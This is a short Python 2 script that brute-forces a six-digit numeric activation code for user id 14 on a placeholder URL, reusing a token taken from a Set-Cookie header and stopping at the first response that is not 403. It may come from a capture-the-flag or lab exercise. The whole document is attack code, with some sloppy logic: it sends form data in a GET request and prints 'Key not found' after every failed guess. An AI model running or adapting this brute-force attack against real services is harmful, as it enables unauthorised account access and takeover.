#!/usr/bin/python
import requests, itertools

url = "https://ip/addess"
cookies = {'Set-Cookie': 'Hacking'}
r = requests.get(url, cookies = cookies)

token = r.headers['Set-Cookie']

char = "0123456789"

for key in itertools.product(char, repeat=6):
	key = ''.join(key)
	data = {'userid': 14, 'activation_code': key, 'token': token}
	r = requests.get(url, cookies=cookies, data=data)
	resp = r.status_code
	if resp != 403:
		print key
		break
	else:
		print "Key not found"
